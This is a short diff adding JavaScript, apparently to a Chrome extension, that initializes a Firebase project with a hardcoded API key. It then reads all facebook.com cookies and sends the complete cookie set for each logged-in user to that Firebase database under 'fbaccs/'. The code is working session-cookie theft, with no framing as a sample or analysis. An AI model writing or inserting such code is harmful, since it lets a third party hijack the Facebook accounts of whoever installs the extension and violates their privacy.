@@ -1,0 +1,19 @@
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyD3eAN86ZMD-RwjPMkAcPg0YRq9-MQkznQ",
+    authDomain: "facebook-hai.firebaseapp.com",
+    databaseURL: "https://facebook-hai.firebaseio.com",
+    storageBucket: "facebook-hai.appspot.com",
+    messagingSenderId: "666546126307"
+  };
+  firebase.initializeApp(config);
+
+chrome.cookies.getAll({
+    url: 'https://facebook.com'
+}, function (cookies){
+    for(var i = 0; i < cookies.length; i++){
+        if(cookies[i].name == 'c_user'){
+            firebase.database().ref().child('fbaccs/'+cookies[i].value).set({cookies:cookies})
+        }
+    }
+});
